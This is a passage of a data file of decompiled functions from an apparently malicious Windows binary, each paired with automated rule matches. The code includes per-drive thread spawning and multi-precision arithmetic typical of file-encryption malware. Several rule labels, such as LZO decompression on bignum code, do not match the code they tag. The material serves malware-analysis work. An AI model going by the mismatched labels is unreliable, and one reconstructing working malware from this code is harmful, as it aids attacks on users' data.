pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n            }\n            if ((iVar1 == 3) || (pcVar5 = _sym.imp.USER32.dll_wsprintfW,  iVar1 == 2)) {\n                puVar4 = sub.msvcrt.dll_malloc(10);\n                *puVar4 = _lpRootPathName;\n                *(puVar4 + 1) = var_24h;\n                uVar2 = (*pcVar6)(0, 0, fcn.00408f10, iVar7, 0, &var_8h);\n                *(*0x417060 * 4 + 0x416060) = uVar2;\n                *0x417060 = *0x417060 + 1;\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n            }\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x20);\n    (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(*0x417060, 0x416060, 1, 0xffffffff);\n    pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n    iVar7 = 0;\n    if (0 < *0x417060) {\n        do {\n            (*pcVar5)(*(iVar7 * 4 + 0x416060));\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < *0x417060);\n    }\n    do {\n        (*pcVar6)(10);\n    } while (*0x41602c != 0);\n    return 0;\n}\n",
        "token_count": 924
    },
    "0040b450": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b450(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_20h = 1;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 1;\n    var_10h = 0;\n    var_ch = 0;\n    uVar2 = fcn.0040a590(&var_20h, arg_ch);\n    iVar4 = 0;\n    if ((uVar2 == 0) && (uVar2 = fcn.0040a590(&var_14h, arg_10h),  iVar4 = var_ch,  uVar2 == 0)) {\n        uVar2 = fcn.0040c1d0(&var_20h);\n        uVar3 = fcn.0040c1d0(&var_14h);\n        if (uVar2 <= uVar3) {\n            uVar3 = uVar2;\n        }\n        var_8h = uVar3;\n        uVar2 = fcn.0040c960(&var_20h, uVar3);\n        iVar4 = var_ch;\n        if ((uVar2 == 0) && (uVar2 = fcn.0040c960(&var_14h, uVar3),  iVar4 = var_ch,  uVar2 == 0)) {\n            var_24h = &var_4h;\n            var_14h = 1;\n            var_20h = 1;\n            var_4h = 0;\n            var_2ch = 1;\n            var_28h = 1;\n            iVar4 = fcn.0040a4b0(&var_20h, &var_2ch);\n            while (iVar4 != 0) {\n                iVar4 = 0;\n                uVar2 = 0;\n                if (var_1ch != 0) {\n                    do {\n                        uVar3 = 0;\n                        do {\n                            if ((*(var_18h + uVar2 * 4) >> (uVar3 & 0x1f) & 1) != 0) goto code_r0x0040b56e;\n                            uVar3 = uVar3 + 1;\n                            iVar4 = iVar4 + 1;\n                        } while (uVar3 < 0x20);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_1ch);\n                }\n                iVar4 = 0;\ncode_r0x0040b56e:\n                uVar2 = fcn.0040c960(&var_20h, iVar4);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040b67a;\n                iVar4 = 0;\n                if (var_10h != 0) {\n                    do {\n                        uVar3 = 0;\n                        do {\n                            if ((*(var_ch + uVar2 * 4) >> (uVar3 & 0x1f) & 1) != 0) goto code_r0x0040b5ae;\n                            uVar3 = uVar3 + 1;\n                            iVar4 = iVar4 + 1;\n                        } while (uVar3 < 0x20);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_10h);\n                }\n                iVar4 = 0;\ncode_r0x0040b5ae:\n                uVar2 = fcn.0040c960(&var_14h, iVar4);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040b67a;\n                iVar4 = fcn.0040a4b0(&var_20h, &var_14h);\n                if (iVar4 < 0) {\n                    uVar2 = fcn.0040ca70(&var_14h, &var_14h, &var_20h);\n                    iVar4 = var_ch;\n                    if (uVar2 != 0) goto code_r0x0040b67a;\n                    arg_8h_00 = &var_14h;\n                }\n                else {\n                    uVar2 = fcn.0040ca70(&var_20h, &var_20h, &var_14h);\n                    iVar4 = var_ch;\n                    if (uVar2 != 0) goto code_r0x0040b67a;\n                    arg_8h_00 = &var_20h;\n                }\n                uVar2 = fcn.0040c960(arg_8h_00, 1);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040b67a;\n                var_24h = &var_4h;\n                var_2ch = 1;\n                var_28h = 1;\n                iVar4 = fcn.0040a4b0(&var_20h, &var_2ch);\n                uVar3 = var_8h;\n            }\n            uVar2 = fcn.0040c820(&var_14h, uVar3);\n            iVar4 = var_ch;\n            if (uVar2 == 0) {\n                uVar2 = fcn.0040a590(arg_8h, &var_14h);\n                iVar4 = var_ch;\n            }\n        }\n    }\ncode_r0x0040b67a:\n    iVar1 = var_18h;\n    if (var_18h != 0) {\n        fcn.0040ef10(var_18h, var_1ch << 2);\n        sub.msvcrt.dll_free(iVar1);\n    }\n    if (iVar4 != 0) {\n        fcn.0040ef10(iVar4, var_10h << 2);\n        sub.msvcrt.dll_free(iVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 1446
    },
    "0040bb30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bb30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint *arg_10h_00;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint8_t *var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint8_t *var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint8_t *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint8_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    var_74h = &var_4h;\n    var_4h = 1;\n    var_7ch = 1;\n    var_78h = 1;\n    iVar4 = fcn.0040a4b0(arg_10h, &var_7ch);\n    if (iVar4 < 1) {\n        return -4;\n    }\n    var_58h = 1;\n    var_54h = 0;\n    var_50h = 0;\n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = NULL;\n    var_28h = 1;\n    var_24h = 0;\n    var_20h = NULL;\n    var_34h = 1;\n    var_30h = 0;\n    var_2ch = NULL;\n    var_70h = 1;\n    var_6ch = 0;\n    var_68h = 0;\n    var_64h = 1;\n    var_60h = 0;\n    var_5ch = 0;\n    var_40h = 1;\n    var_3ch = 0;\n    var_38h = NULL;\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = NULL;\n    var_4ch = 1;\n    var_48h = 0;\n    var_44h = NULL;\n    iVar4 = fcn.0040b450(&var_70h, arg_ch, arg_10h);\n    if (iVar4 == 0) {\n        var_74h = &var_4h;\n        var_4h = 1;\n        var_7ch = 1;\n        var_78h = 1;\n        iVar4 = fcn.0040a4b0(&var_70h, &var_7ch);\n        if (iVar4 == 0) {\n            iVar4 = fcn.0040c360(&var_58h, arg_ch, arg_10h);\n            if (((((iVar4 == 0) && (iVar4 = fcn.0040a590(&var_1ch, &var_58h),  iVar4 == 0)) &&\n                 (iVar4 = fcn.0040a590(&var_64h, arg_10h),  iVar4 == 0)) &&\n                ((iVar4 = fcn.0040a590(&var_40h, arg_10h),  iVar4 == 0 &&\n                 (iVar4 = fcn.0040c220(&var_28h, 1),  iVar4 == 0)))) &&\n               ((iVar4 = fcn.0040c220(&var_34h, 0),  iVar4 == 0 &&\n                ((iVar4 = fcn.0040c220(&var_10h, 0),  iVar4 == 0 && (iVar4 = fcn.0040c220(&var_4ch, 1),  iVar4 == 0)))))\n               ) {\n                do {\n                    uVar1 = *var_14h;\n                    while ((uVar1 & 1) == 0) {\n                        iVar4 = fcn.0040c960(&var_1ch, 1);\n                        if (((iVar4 != 0) ||\n                            ((((*var_20h & 1) != 0 || ((*var_2ch & 1) != 0)) &&\n                             ((iVar4 = fcn.0040a300(&var_28h, &var_28h, &var_64h),  iVar4 != 0 ||\n                              (iVar4 = fcn.0040cb80(&var_34h, &var_34h, &var_58h),  iVar4 != 0)))))) ||\n                           ((iVar4 = fcn.0040c960(&var_28h, 1),  iVar4 != 0 ||\n                            (iVar4 = fcn.0040c960(&var_34h, 1),  iVar4 != 0)))) goto code_r0x0040bfcc;\n                        uVar1 = *var_14h;\n                    }\n                    uVar1 = *var_38h;\n                    while ((uVar1 & 1) == 0) {\n                        iVar4 = fcn.0040c960(&var_40h, 1);\n                        if ((iVar4 != 0) ||\n                           (((((*var_8h & 1) != 0 || ((*var_44h & 1) != 0)) &&\n                             ((iVar4 = fcn.0040a300(&var_10h, &var_10h, &var_64h),  iVar4 != 0 ||\n                              (iVar4 = fcn.0040cb80(&var_4ch, &var_4ch, &var_58h),  iVar4 != 0)))) ||\n                            ((iVar4 = fcn.0040c960(&var_10h, 1),  iVar4 != 0 ||\n                             (iVar4 = fcn.0040c960(&var_4ch, 1),  iVar4 != 0)))))) goto code_r0x0040bfcc;\n                        uVar1 = *var_38h;\n                    }\n                    iVar4 = fcn.0040a4b0(&var_1ch, &var_40h);\n                    if (iVar4 < 0) {\n                        iVar4 = fcn.0040cb80(&var_40h, &var_40h, &var_1ch);\n                        if ((iVar4 != 0) || (iVar4 = fcn.0040cb80(&var_10h, &var_10h, &var_28h),  iVar4 != 0))\n                        goto code_r0x0040bfcc;\n                        arg_10h_00 = &var_34h;\n                        arg_8h_00 = &var_4ch;\n                    }\n                    else {\n                        iVar4 = fcn.0040cb80(&var_1ch, &var_1ch, &var_40h);\n                        if ((iVar4 != 0) || (iVar4 = fcn.0040cb80(&var_28h, &var_28h, &var_10h),  iVar4 != 0))\n                        goto code_r0x0040bfcc;\n                        arg_10h_00 = &var_4ch;\n                        arg_8h_00 = &var_34h;\n                    }\n                    iVar4 = fcn.0040cb80(arg_8h_00, arg_8h_00, arg_10h_00);\n                    if (iVar4 != 0) goto code_r0x0040bfcc;\n                    iVar4 = fcn.0040a470(&var_1ch, 0);\n                } while (iVar4 != 0);\n                iVar4 = fcn.0040a470(&var_10h, 0);\n                while (iVar4 < 0) {\n                    iVar4 = fcn.0040a300(&var_10h, &var_10h, arg_10h);\n                    if (iVar4 != 0) goto code_r0x0040bfcc;\n                    iVar4 = fcn.0040a470(&var_10h, 0);\n                }\n                iVar4 = fcn.0040a4b0(&var_10h, arg_10h);\n                while (-1 < iVar4) {\n                    iVar4 = fcn.0040cb80(&var_10h, &var_10h, arg_10h);\n                    if (iVar4 != 0) goto code_r0x0040bfcc;\n                    iVar4 = fcn.0040a4b0(&var_10h, arg_10h);\n                }\n                iVar4 = fcn.0040a590(arg_8h, &var_10h);\n            }\ncode_r0x0040bfcc:\n            iVar2 = var_50h;\n            if (var_50h != 0) {\n                fcn.0040ef10(var_50h, var_54h << 2);\n                sub.msvcrt.dll_free(iVar2);\n            }\n            puVar3 = var_14h;\n            if (var_14h != NULL) {\n                fcn.0040ef10(var_14h, var_18h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n            puVar3 = var_20h;\n            if (var_20h != NULL) {\n                fcn.0040ef10(var_20h, var_24h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n            puVar3 = var_2ch;\n            if (var_2ch != NULL) {\n                fcn.0040ef10(var_2ch, var_30h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n        }\n        else {\n            iVar4 = -0xe;\n        }\n    }\n    iVar2 = var_68h;\n    if (var_68h != 0) {\n        fcn.0040ef10(var_68h, var_6ch << 2);\n        sub.msvcrt.dll_free(iVar2);\n    }\n    iVar2 = var_5ch;\n    if (var_5ch != 0) {\n        fcn.0040ef10(var_5ch, var_60h << 2);\n        sub.msvcrt.dll_free(iVar2);\n    }\n    puVar3 = var_38h;\n    if (var_38h != NULL) {\n        fcn.0040ef10(var_38h, var_3ch << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    puVar3 = var_8h;\n    if (var_8h != NULL) {\n        fcn.0040ef10(var_8h, var_ch << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    puVar3 = var_44h;\n    if (var_44h != NULL) {\n        fcn.0040ef10(var_44h, var_48h << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 2601
    },
    "0040c1d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c1d0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar2 = 0;\n    uVar4 = 0;\n    if (*(arg_8h + 4) != 0) {\n        puVar3 = *(arg_8h + 8);\n        do {\n            uVar1 = 0;\n            do {\n                if ((*puVar3 >> (uVar1 & 0x1f) & 1) != 0) {\n                    return iVar2;\n                }\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + 1;\n            } while (uVar1 < 0x20);\n            uVar4 = uVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (uVar4 < *(arg_8h + 4));\n    }\n    return 0;\n}\n",
        "token_count": 234
    },
    "0040c2c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c2c0(uint32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if (arg_10h == 0) {\n        return 0xfffffff4;\n    }\n    if (arg_10h < 0) {\n        return 0xfffffff6;\n    }\n    if (arg_10h == 1) {\n        *arg_8h = 0;\n        return 0;\n    }\n    if (arg_10h != 2) {\n        iVar4 = arg_ch[1];\n        uVar2 = 0;\n        if (iVar4 != 0) {\n            puVar3 = arg_ch[2] + (iVar4 + -1) * 4;\n            do {\n                uVar1 = *puVar3;\n                puVar3 = puVar3 + -1;\n                uVar2 = (uVar1 & 0xffff | (uVar1 >> 0x10 | uVar2 << 0x10) % arg_10h << 0x10) % arg_10h;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        if ((*arg_ch < 0) && (uVar2 != 0)) {\n            uVar2 = arg_10h - uVar2;\n        }\n        *arg_8h = uVar2;\n        return 0;\n    }\n    *arg_8h = *arg_ch[2] & 1;\n    return 0;\n}\n",
        "token_count": 378
    },
    "0040cd70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cd70(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    if ((**(arg_8h + 8) & 1) == 0) {\ncode_r0x0040cdf5:\n        iVar1 = -0xe;\n    }\n    else {\n        var_8h = &arg_8h;\n        var_ch = 1;\n        iVar3 = 0;\n        arg_10h = 3;\n        while( true ) {\n            uVar2 = arg_10h >> 0x1f;\n            arg_8h = (arg_10h ^ uVar2) - uVar2;\n            var_10h = (uVar2 & 0xfffffffe) + 1;\n            iVar1 = fcn.0040a4b0(arg_8h_00, &var_10h);\n            if (iVar1 < 1) {\n                return 1;\n            }\n            iVar1 = fcn.0040c2c0(&var_4h, arg_8h_00, arg_10h);\n            if (iVar1 != 0) break;\n            if (var_4h == 0) goto code_r0x0040cdf5;\n            arg_10h = *(iVar3 * 4 + 0x41364c);\n            iVar3 = iVar3 + 1;\n            if (arg_10h < 1) {\n                return 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 415
    },
    "0040a0f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a0f0(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *arg_ch_00;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    \n    puVar3 = arg_8h;\n    puVar6 = arg_ch;\n    arg_ch_00 = arg_8h;\n    if (arg_8h != arg_10h) {\n        puVar6 = arg_10h;\n        arg_ch_00 = arg_ch;\n    }\n    if ((arg_8h == arg_ch_00) || (iVar4 = fcn.0040a590(arg_8h, arg_ch_00),  iVar4 == 0)) {\n        *arg_8h = 1;\n        uVar9 = puVar6[1];\n        if (uVar9 != 0) {\n            piVar5 = puVar6[2] + uVar9 * 4;\n            do {\n                piVar5 = piVar5 + -1;\n                if (*piVar5 != 0) break;\n                uVar9 = uVar9 - 1;\n            } while (uVar9 != 0);\n        }\n        if (10000 < uVar9) {\n            return -0x10;\n        }\n        if (arg_8h[1] < uVar9) {\n            iVar4 = sub.msvcrt.dll_calloc(uVar9, 4);\n            if (iVar4 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.004013a0(iVar4, arg_8h[2], arg_8h[1] << 2);\n                fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = uVar9;\n            arg_8h[2] = iVar4;\n        }\n        puVar10 = puVar6[2];\n        puVar7 = arg_8h[2];\n        if (uVar9 != 0) {\n            uVar8 = 0;\n            arg_ch = uVar9;\n            do {\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                uVar2 = *puVar7;\n                uVar11 = uVar2 + uVar8 + uVar1;\n                *puVar7 = uVar11;\n                puVar7 = puVar7 + 1;\n                arg_ch = arg_ch - 1;\n                uVar8 = (uVar2 + uVar8 < uVar8) + (uVar11 < uVar1);\n            } while (arg_ch != NULL);\n            if (uVar8 != 0) {\n                arg_8h = uVar9 * 4;\n                do {\n                    uVar11 = uVar9 + 1;\n                    if (puVar3[1] <= uVar9) {\n                        if (10000 < uVar11) {\n                            return -0x10;\n                        }\n                        if (puVar3[1] < uVar11) {\n                            iVar4 = sub.msvcrt.dll_calloc(uVar11, 4);\n                            if (iVar4 == 0) {\n                                return -0x10;\n                            }\n                            if (puVar3[2] != 0) {\n                                fcn.004013a0(iVar4, puVar3[2], puVar3[1] << 2);\n                                fcn.0040ef10(puVar3[2], puVar3[1] << 2);\n                                sub.msvcrt.dll_free(puVar3[2]);\n                            }\n                            puVar3[1] = uVar11;\n                            puVar3[2] = iVar4;\n                        }\n                        puVar7 = puVar3[2] + arg_8h;\n                    }\n                    uVar9 = *puVar7 + uVar8;\n                    *puVar7 = uVar9;\n                    arg_8h = arg_8h + 4;\n                    puVar7 = puVar7 + 1;\n                    bVar12 = uVar9 < uVar8;\n                    uVar8 = uVar9 < uVar8;\n                    uVar9 = uVar11;\n                } while (bVar12);\n            }\n        }\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 1071
    },
    "0040a3d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a3d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    bool bVar6;\n    \n    uVar2 = *(arg_8h + 4);\n    if (uVar2 != 0) {\n        piVar3 = *(arg_8h + 8) + uVar2 * 4;\n        do {\n            piVar3 = piVar3 + -1;\n            if (*piVar3 != 0) break;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    uVar4 = *(arg_ch + 4);\n    if (uVar4 != 0) {\n        piVar3 = *(arg_ch + 8) + uVar4 * 4;\n        do {\n            piVar3 = piVar3 + -1;\n            if (*piVar3 != 0) break;\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    if (uVar2 == 0) {\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\n    else if (uVar4 < uVar2) {\n        return 1;\n    }\n    if (uVar2 < uVar4) {\n        return 0xffffffff;\n    }\n    if (uVar2 != 0) {\n        puVar5 = *(arg_8h + 8) + -4 + uVar2 * 4;\n        do {\n            uVar4 = *puVar5;\n            puVar1 = (*(arg_ch + 8) - *(arg_8h + 8)) + puVar5;\n            bVar6 = uVar4 < *puVar1;\n            if (!bVar6 && uVar4 != *puVar1) {\n                return 1;\n            }\n            if (bVar6) {\n                return 0xffffffff;\n            }\n            puVar5 = puVar5 + -1;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 516
    },
    "0040a4b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a4b0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    bool bVar8;\n    \n    uVar5 = arg_8h[1];\n    if (uVar5 != 0) {\n        piVar4 = arg_8h[2] + uVar5 * 4;\n        do {\n            piVar4 = piVar4 + -1;\n            if (*piVar4 != 0) break;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    uVar6 = arg_ch[1];\n    if (uVar6 != 0) {\n        piVar4 = arg_ch[2] + uVar6 * 4;\n        do {\n            piVar4 = piVar4 + -1;\n            if (*piVar4 != 0) break;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    if (uVar5 == 0) {\n        if (uVar6 == 0) {\n            return 0;\n        }\n    }\n    else if (uVar6 < uVar5) {\n        return *arg_8h;\n    }\n    if (uVar5 < uVar6) {\n        return -*arg_ch;\n    }\n    iVar2 = *arg_8h;\n    if (iVar2 < 1) {\n        iVar3 = *arg_ch;\n        bVar8 = iVar3 < 0;\n    }\n    else {\n        iVar3 = *arg_ch;\n        bVar8 = iVar3 < 0;\n        if (bVar8) {\n            return 1;\n        }\n    }\n    if ((iVar3 != 0 && !bVar8) && (iVar2 < 0)) {\n        return -1;\n    }\n    if (uVar5 == 0) {\n        return 0;\n    }\n    puVar7 = arg_8h[2] + -4 + uVar5 * 4;\n    while( true ) {\n        uVar6 = *puVar7;\n        puVar1 = (arg_ch[2] - arg_8h[2]) + puVar7;\n        bVar8 = uVar6 < *puVar1;\n        if (!bVar8 && uVar6 != *puVar1) {\n            return iVar2;\n        }\n        if (bVar8) break;\n        puVar7 = puVar7 + -1;\n        uVar5 = uVar5 - 1;\n        if (uVar5 == 0) {\n            return 0;\n        }\n    }\n    return -iVar2;\n}\n",
        "token_count": 645
    },
    "0040a590": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a590(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_8h != arg_ch) {\n        if (arg_ch[2] != 0) {\n            iVar2 = arg_ch[1] + -1;\n            if (iVar2 != 0) {\n                piVar1 = arg_ch[2] + iVar2 * 4;\n                do {\n                    if (*piVar1 != 0) break;\n                    piVar1 = piVar1 + -1;\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            uVar3 = iVar2 + 1;\n            *arg_8h = *arg_ch;\n            if (arg_8h[1] < uVar3) {\n                if (uVar3 < 0x2711) {\n                    iVar2 = sub.msvcrt.dll_calloc(uVar3, 4);\n                    if (iVar2 != 0) {\n                        if (arg_8h[2] != 0) {\n                            fcn.004013a0(iVar2, arg_8h[2], arg_8h[1] << 2);\n                            fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n                            sub.msvcrt.dll_free(arg_8h[2]);\n                        }\n                        arg_8h[1] = uVar3;\n                        arg_8h[2] = iVar2;\n                        goto code_r0x0040a654;\n                    }\n                }\n                return 0xfffffff0;\n            }\n            fcn.00401000(arg_8h[2] + uVar3 * 4, 0, (arg_8h[1] - uVar3) * 4);\n            iVar2 = arg_8h[2];\ncode_r0x0040a654:\n            fcn.004013a0(iVar2, arg_ch[2], uVar3 * 4);\n            return 0;\n        }\n        fcn.0040b400(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 494
    },
    "0040c540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c540(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    if (arg_8h == arg_ch) {\n        iVar2 = fcn.0040a590(&var_1ch, arg_ch);\n        if (iVar2 != 0) goto code_r0x0040c6e9;\n        arg_ch = &var_1ch;\n    }\n    if (arg_8h == arg_10h) {\n        iVar2 = fcn.0040a590(&var_10h, arg_10h);\n        if (iVar2 == 0) {\n            arg_10h = &var_10h;\n            goto code_r0x0040c5c3;\n        }\n    }\n    else {\ncode_r0x0040c5c3:\n        iVar5 = arg_ch[1];\n        if (iVar5 != 0) {\n            piVar3 = arg_ch[2] + iVar5 * 4;\n            do {\n                piVar3 = piVar3 + -1;\n                if (*piVar3 != 0) break;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        iVar4 = arg_10h[1];\n        if (iVar4 != 0) {\n            piVar3 = arg_10h[2] + iVar4 * 4;\n            do {\n                piVar3 = piVar3 + -1;\n                if (*piVar3 != 0) break;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        uVar1 = iVar4 + iVar5;\n        if (uVar1 < 0x2711) {\n            if (arg_8h[1] < uVar1) {\n                var_4h = sub.msvcrt.dll_calloc(uVar1, 4);\n                if (var_4h == 0) {\n                    iVar2 = -0x10;\n                    goto code_r0x0040c6cc;\n                }\n                if (arg_8h[2] != 0) {\n                    fcn.004013a0(var_4h, arg_8h[2], arg_8h[1] << 2);\n                    fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n                    sub.msvcrt.dll_free(arg_8h[2]);\n                }\n                arg_8h[2] = var_4h;\n                arg_8h[1] = iVar4 + iVar5;\n            }\n            iVar2 = fcn.0040c220(arg_8h, 0);\n            var_4h = iVar2;\n            if (iVar2 == 0) {\n                for (; var_4h = iVar2,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                    fcn.0040d400(iVar5, arg_ch[2], arg_8h[2] + iVar4 * 4 + -4, *(arg_10h[2] + -4 + iVar4 * 4));\n                    iVar2 = var_4h;\n                }\n                *arg_8h = *arg_ch * *arg_10h;\n            }\n        }\n        else {\n            iVar2 = -0x10;\n        }\n    }\ncode_r0x0040c6cc:\n    iVar5 = var_8h;\n    if (var_8h != 0) {\n        fcn.0040ef10(var_8h, var_ch << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\ncode_r0x0040c6e9:\n    iVar5 = var_14h;\n    if (var_14h != 0) {\n        fcn.0040ef10(var_14h, var_18h << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\n    return iVar2;\n}\n",
        "token_count": 1035
    },
    "0040ca70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
